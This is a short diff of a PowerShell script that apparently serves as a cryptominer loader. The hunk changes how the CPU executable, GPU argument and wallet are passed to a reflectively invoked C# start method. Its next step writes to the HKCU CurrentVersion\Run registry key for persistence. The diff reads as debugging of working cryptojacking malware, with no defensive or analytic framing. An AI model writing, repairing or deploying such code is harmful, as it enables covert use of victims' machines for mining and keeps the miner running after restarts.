@@ -53,8 +53,8 @@ try {
     
     $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
     Write-Host "[*] Invoking Miner Process..."
-    # Explicitly casting to [string] prevents PSObject wrapping errors when passing to C#
-    $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
+    # Passing arguments separated by commas bypasses the array casting bug in PS
+    $startMethod.Invoke($null, @("$CpuExe", "$GpuArg", "$Wallet"))
     
     Write-Host "[*] Hooking Registry..."
     $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
